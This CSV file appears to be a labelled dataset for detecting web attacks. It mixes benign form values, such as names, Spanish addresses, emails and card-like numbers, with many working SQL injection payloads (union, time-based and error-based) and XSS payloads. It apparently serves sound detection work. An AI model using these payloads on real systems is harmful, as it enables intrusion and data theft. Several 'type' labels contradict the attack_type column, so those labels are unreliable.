Text,attack_type,Label,type
"1"") where 8254=8254 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1%""))) union all select null,null,null,null,null,null#",sqli,1,sql
siena 76 8-c,norm,0,normal
randa,norm,0,normal
"1%"" or 6793=(select 6793 from pg_sleep(5)) and ""%""=""",sqli,1,sql
09718670c,norm,0,normal
posa mura,norm,0,normal
"-7802'))) or elt(8778=9974,9974) and ((('glsq' like 'glsq",sqli,1,normal
"-5073"") or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (""kbab"" like ""kbab",sqli,1,sql
"1'+(select zbyt where 4575=4575 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x))+'",sqli,1,sql
fuente-lamo,norm,0,normal
almazara,norm,0,normal
monistca tunaroza,norm,0,normal
"1')) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (('hfqz'='hfqz",sqli,1,sql
"<video id=xss poster=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))//",xss,2,xss
huayraruna,norm,0,normal
"-1483' or make_set(9354=9354,7185) and 'qfil'='qfil",sqli,1,normal
"1%"") or (select * from (select(sleep(5)))sddo)#",sqli,1,sql
armstron,norm,0,normal
"1%"" or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
5258739000426196,norm,0,normal
3jeno,norm,0,normal
"1"")) as ogzn where 6849=6849 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"-9535"" order by 1--",sqli,1,sql
1122690078978672,norm,0,normal
">""<script <b>document.cookie=true;</script>",xss,2,xss
-2483' where 1327=1327 union all select 1327#,sqli,1,sql
"1%"") union all select null,null,null,null#",sqli,1,sql
"-3063%""))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""%""=""",sqli,1,sql
4210,norm,0,normal
joseph,norm,0,normal
dangers9@paremoselalzheimer.az,norm,0,normal
(select (case when (6461=1802) then 1 else cast(1 as int)/(select 0 from dual) end) from dual),sqli,1,sql
descapotar,norm,0,normal
budia,norm,0,normal
luhmaan,norm,0,normal
"iif(2976=2976,1,1/0)",sqli,1,normal
armaanzas,norm,0,normal
"1',iif(9496=4153,1,1/0)",sqli,1,normal
llers marquile,norm,0,normal
intern5r,norm,0,normal
"1)) union all select null,null,null--",sqli,1,sql
"1%'))) union all select null,null,null,null,null,null,null,null#",sqli,1,sql
mame,norm,0,normal
corkstow,norm,0,normal
3250,norm,0,normal
"1%' or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and '%'='",sqli,1,normal
2187090627457981,norm,0,normal
"1""));select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
bees3,norm,0,normal
clivosa,norm,0,normal
kowalska@carmensanmartin.uz,norm,0,normal
"paseo alameda de osuna 10,",norm,0,normal
1680,norm,0,normal
negrich,norm,0,normal
antonio ulloa 6 6?d,norm,0,normal
64526656h,norm,0,normal
"1%"");select benchmark(5000000,md5(0x4c4d6142)) and (""%""=""",sqli,1,sql
"1'||(select 'ysij' from dual where 6140=6140 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1))||'",sqli,1,sql
nicolle,norm,0,normal
puebla de obando,norm,0,normal
"1%"") and 4595=4595#",sqli,1,normal
nava de bjar,norm,0,normal
6718614214297094,norm,0,normal
06105,norm,0,normal
"1,(select (case when (6750=6750) then 1 else 6750*(select 6750 from information_schema.character_sets) end))",sqli,1,sql
"1"" where 4633=4633 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,1,sql
"cami antic animeta 43,",norm,0,normal
p4i6at122,norm,0,normal
tesalnico,norm,0,normal
"'""""><script language=""javascript""> alert('x s s');</script>",xss,2,xss
7681,norm,0,normal
-3185')) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('rknd' like 'rknd,sqli,1,sql
"praza general mola, 5 8?g",norm,0,normal
"<<script>alert(""crosssitescripting"");//<</script>",xss,2,xss
"-8153' where 2436=2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",sqli,1,sql
requa@alcantarapartners.zw,norm,0,normal
1%')) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (('%'=',sqli,1,sql
dulra@kpincentives.sr,norm,0,normal
4551401932172135,norm,0,normal
kelcy,norm,0,normal
"san clemente 24,",norm,0,normal
magrans ribes,norm,0,normal
cecile,norm,0,normal
"faus 195,",norm,0,normal
co01,norm,0,normal
1';select (case when (8993=4660) then 1 else 8993*(select 8993 from master..sysdatabases) end)--,sqli,1,sql
89816761j,norm,0,normal
pincel,norm,0,normal
1%'))) and 9198=9198--,sqli,1,sql
"1"" where 9172=9172 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",sqli,1,sql
06443,norm,0,normal
"1"")));begin dbms_lock.sleep(5); end and (((""zpii"" like ""zpii",sqli,1,sql
"-2225' union all select 1545,1545,1545,1545#",sqli,1,sql
cer97708or7,norm,0,normal
40151,norm,0,normal
eberto,norm,0,normal
rosa,norm,0,normal
trufa4dor,norm,0,normal
67663365x,norm,0,normal
resello,norm,0,normal
cote suengas,norm,0,normal
"1' where 9602=9602;select benchmark(5000000,md5(0x4c4d6142))--",sqli,1,sql
amlani,norm,0,normal
3ar6i383,norm,0,normal
1%'));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
abejar,norm,0,normal
albercoque,norm,0,normal
"1')) as oldh where 9551=9551 union all select null,null,null#",sqli,1,sql
78977050h,norm,0,normal
7x,norm,0,normal
marines,norm,0,normal
1820,norm,0,normal
sides,norm,0,normal
8569,norm,0,normal
calle guatemala 12 11c,norm,0,normal
lor81a5o,norm,0,normal
gurupera,norm,0,normal
"1') and elt(1210=1210,sleep(5)) and ('udvq'='udvq",sqli,1,normal
hews,norm,0,normal
"1"") where 1212=1212 and 8475=5864",sqli,1,normal
ellacott2,norm,0,normal
maureen,norm,0,normal
calle espiel 71,norm,0,normal
menaker,norm,0,normal
"1));select count(*) from generate_series(1,5000000) and ((7240=7240",sqli,1,sql
19461,norm,0,normal
"-3775') as rqet where 7092=7092 or elt(1032=1032,3623)--",sqli,1,sql
0928851427911664,norm,0,normal
cmitre,norm,0,normal
60380887e,norm,0,normal
8515880791800894,norm,0,normal
8788488827685780,norm,0,normal
fedoruk,norm,0,normal
"1')) as mxxd where 7255=7255 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"""javascript:alert(1)""></table>",xss,2,xss
18vi5i9ad,norm,0,normal
calle ramon mario mirazo 46,norm,0,normal
valdelcubo,norm,0,normal
"1"") as ltbl where 6395=6395;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
silas,norm,0,normal
"-4205') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",sqli,1,sql
"1)) as klmm where 3107=3107;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli,1,sql
jaswal,norm,0,normal
"1'||(select 'vsfg' where 3547=3547 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161))||'",sqli,1,sql
"1""));select (case when (6961=7460) then 1 else 6961*(select 6961 from master..sysdatabases) end)--",sqli,1,sql
97176413x,norm,0,normal
38888523p,norm,0,normal
1858844591273979,norm,0,normal
serrano,norm,0,normal
girona,norm,0,normal
"masia can ruti 142, 1-b",norm,0,normal
ciadoncha,norm,0,normal
harty,norm,0,normal
seema@ajedrezconmaestros.ne,norm,0,normal
"calle roma, 189, 12h",norm,0,normal
dunn,norm,0,normal
"1) where 7600=7600 union all select null,null,null,null,null,null--",sqli,1,sql
nidya,norm,0,normal
yu-chian,norm,0,normal
jarvis-wassmann@classroommanager.pe,norm,0,normal
44706,norm,0,normal
1riot_0115a,norm,0,normal
acomplexionada,norm,0,normal
"-3126)) union all select 6718,6718,6718,6718,6718--",sqli,1,sql
"-5386') union all select 8026,8026,8026,8026,8026,8026#",sqli,1,sql
"plaza san miguel 132,",norm,0,normal
"1'))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('qvqf'='qvqf",sqli,1,sql
"-3505"") or 5290=3436--",sqli,1,sql
bohyun,norm,0,normal
"1'+(select 'dbvq' where 2045=2045 or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,sql
braiam,norm,0,normal
"-4025"" or 3038=3038",sqli,1,normal
2865,norm,0,normal
3153195738365975,norm,0,normal
santa marina del rey,norm,0,normal
7024918540973284,norm,0,normal
chirlern,norm,0,normal
gorrero,norm,0,normal
jellison@acch-portugal.uk,norm,0,normal
"1,(select (case when (9644=9644) then dbms_pipe.receive_message(chr(75)||chr(78)||chr(104)||chr(98),5) else 1/(select 0 from dual) end) from dual)",sqli,1,sql
1) as hggi where 6511=6511;select (case when (1434=1549) then 1434 else 1434*(select 1434 from mysql.db) end)#,sqli,1,sql
1 where 4245=4245;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
"1"" and (3020=3020)*6703 and ""tnzp"" like ""tnzp",sqli,1,normal
escamada,norm,0,normal
67094993z,norm,0,normal
"-6815) where 2498=2498 union all select 2498,2498,2498,2498,2498--",sqli,1,sql
"1') as asjj where 1721=1721 union all select null,null,null,null,null,null--",sqli,1,sql
tal gorriz,norm,0,normal
1g5ota323,norm,0,normal
rorke,norm,0,normal
sant andreu salou,norm,0,normal
"1' and make_set(4952=7129,7129)",sqli,1,normal
ex8ed2ci3,norm,0,normal
55585768n,norm,0,normal
"1'));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
oesterlein@connect.pw,norm,0,normal
"1%"")) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((""%""=""",sqli,1,sql
ceseri@discotecateatre.do,norm,0,normal
09824561l,norm,0,normal
marazuela,norm,0,normal
yamasaki@multaspendientes.eg,norm,0,normal
1' waitfor delay '0:0:5' and 'vwuz'='vwuz,sqli,1,normal
fornea,norm,0,normal
"petxina, 77, 2b",norm,0,normal
"1%' union all select null,null,null,null,null,null,null#",sqli,1,sql
muoz birosta,norm,0,normal
badia del valls,norm,0,normal
1'));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
1')) and (1427=5813)*5813 and (('estb' like 'estb,sqli,1,normal
27190,norm,0,normal
1')) rlike (select * from (select(sleep(5)))sgvo) and (('pemj'='pemj,sqli,1,sql
av. alfonso puchades s/n 11f,norm,0,normal
8clo736,norm,0,normal
"1' union all select null,null,null,null,null--",sqli,1,sql
arpad4@emepleo.lr,norm,0,normal
"1%')(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ('%'='",sqli,1,sql
1) where 3979=3979 rlike sleep(5)--,sqli,1,sql
07375030b,norm,0,normal
1) where 4479=4479 rlike (select (case when (6351=4367) then 1 else 0x28 end))--,sqli,1,sql
"1';select like('abcdefg',upper(hex(randomblob(500000000/2)))) and 'cwuy'='cwuy",sqli,1,sql
1'+(select qsmo where 3172=3172;select (case when (4780=4432) then 4780 else 4780*(select 4780 from mysql.db) end)#,sqli,1,sql
"1' and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))",sqli,1,sql
philips@davidymamen.sa,norm,0,normal
"1"")) as ynuw where 9138=9138;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",sqli,1,sql
"c/ doctor temes fernandez, 35",norm,0,normal
"1'))) and elt(9501=8427,8427) and ((('ahpp'='ahpp",sqli,1,normal
"-3364%""))) union all select 5464--",sqli,1,sql
1%')) rlike sleep(5) and (('%'=',sqli,1,normal
sendra rull,norm,0,normal
foixenc illanes,norm,0,normal
1) union all select null#,sqli,1,sql
-saborete,norm,0,normal
"1'+(select 'tjvt' where 2463=2463;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
hadel,norm,0,normal
fajardos espuna,norm,0,normal
49626,norm,0,normal
ivonne,norm,0,normal
"-6305""))) or 8097=2048 and (((""euyy"" like ""euyy",sqli,1,normal
"-4807' where 3232=3232 or make_set(6599=5179,5179)--",sqli,1,sql
"1) as hvsk where 7902=7902;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
"1"") where 1699=1699 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"c/ son toells 110, 9?h",norm,0,normal
eclar@magadan.org.edu,norm,0,normal
"1)) as hpxw where 1826=1826 union all select null,null,null,null,null,null,null,null#",sqli,1,sql
arjan,norm,0,normal
"sanchez 49,",norm,0,normal
"1""))) or elt(6272=6272,sleep(5)) and (((""jref"" like ""jref",sqli,1,normal
1') as jztg where 1222=1222 or sleep(5)#,sqli,1,normal
"-2284%"")) or 9323=9323#",sqli,1,normal
groen@civicosdns.na,norm,0,normal
<iframe id=xss <?php echo chr(12)?> onload=alert(/xss/)></iframe>,xss,2,xss
1 and (select * from (select(sleep(5)))fzno)# bkjl,sqli,1,sql
51942267x,norm,0,normal
12311,norm,0,normal
manlio,norm,0,normal
feamma,norm,0,normal
leigh_hellinger@atorre.sy,norm,0,normal
"-2862'))) union all select 6649,6649--",sqli,1,sql
kimbrell@erasmusrooms.cu,norm,0,normal
3723526931599696,norm,0,normal
"<img src=""javascript:alert('crosssitescripting');"">",xss,2,xss
robeling.colmar8@diagnosticoradiologico.nf,norm,0,normal
1') as pudv where 2609=2609;(select * from (select(sleep(5)))srmq)--,sqli,1,sql
"-2140)) union all select 8174,8174,8174#",sqli,1,sql
"1"")));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",sqli,1,sql
"-4152"") where 9781=9781 union all select 9781,9781,9781,9781,9781--",sqli,1,sql
-4410 where 5749=5749 or 1317=9823--,sqli,1,sql
"-2782"" union all select 2109,2109,2109#",sqli,1,sql
keehn,norm,0,normal
-2761 or 1144=7657-- mfml,sqli,1,sql
"silos, los",norm,0,normal
desintegrar,norm,0,normal
9173064367648056,norm,0,normal
13710,norm,0,normal
45935212a,norm,0,normal
"1"") as tqxa where 6751=6751 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
"plaa del mercat, 198 7-c",norm,0,normal
"calle evora, 58,",norm,0,normal
lucar planes,norm,0,normal
-1714' union all select 6687--,sqli,1,sql
stalin,norm,0,normal
insanable,norm,0,normal
gidaro,norm,0,normal
schaafsma@gay-tantra.sj,norm,0,normal
"1') where 6672=6672 union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
1' in boolean mode) waitfor delay '0:0:5'#,sqli,1,normal
"-6129 union all select 9122,9122#",sqli,1,sql
(select (case when (6838=2866) then 6838 else 1/(select 0) end)),sqli,1,sql
1 waitfor delay '0:0:5'-- nnnp,sqli,1,sql
2637,norm,0,normal
1'||(select 'xdzp' from dual where 5786=5786 and (3020=3020)*6703)||',sqli,1,sql
taneda@ajuntamentdebcn20.be,norm,0,normal
rolnick,norm,0,normal
amarili,norm,0,normal
"-7032') as xmmm where 5635=5635 union all select 5635,5635,5635,5635,5635--",sqli,1,sql
""";alert('crosssitescripting');//",xss,2,sql
"1%"") or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
urkiaga,norm,0,normal
pueblica de valverde,norm,0,normal
aldunce garbino,norm,0,normal
"<style>li {list-style-image: url(""javascript:alert('xss');</style><ul><li>xss",xss,2,xss
"1'+(select 'tzyz' where 4912=4912 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
c358ra,norm,0,normal
36563093q,norm,0,normal
"vallespir, 164,",norm,0,normal
hormachea vilamasa,norm,0,normal
saiz,norm,0,normal
0731466925802277,norm,0,normal
9304951385291211,norm,0,normal
lonnie,norm,0,normal
16360,norm,0,normal
"1%"")) waitfor delay '0:0:5' and ((""%""=""",sqli,1,normal
3ule1s,norm,0,normal
04146926a,norm,0,normal
"1'+(select zfpk where 9784=9784 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))+'",sqli,1,sql
"-7868"" union all select 1805--",sqli,1,sql
0383494662597592,norm,0,normal
32783648t,norm,0,normal
"1');iif(5257=5257,1,1/0)",sqli,1,sql
2239348379899052,norm,0,normal
buddy0,norm,0,normal
trenaman_bourbault@sms24h.ar,norm,0,normal
48031,norm,0,normal
6ho7rca5u16,norm,0,normal
"1 where 6369=6369 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",sqli,1,sql
"-8868"") where 5681=5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681--",sqli,1,sql
9667,norm,0,normal
"1"" and 8407=(select count(*) from generate_series(1,5000000))",sqli,1,sql
"<body background=javascript:'""><script>alert(xss)</script>></body>",xss,2,xss
07831245k,norm,0,normal
"-6249'))) union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--",sqli,1,sql
scriptalert(crosssitescripting)/script,xss,2,normal
"-6076"")) or 8277=4757",sqli,1,normal
-3597')) order by 1--,sqli,1,sql
torreblacos,norm,0,normal
febrido,norm,0,normal
"c/ barranc de jonqueres, 186,",norm,0,normal
"1"" where 7599=7599;begin user_lock.sleep(5); end--",sqli,1,sql
barakaldo,norm,0,normal
torell berber,norm,0,normal
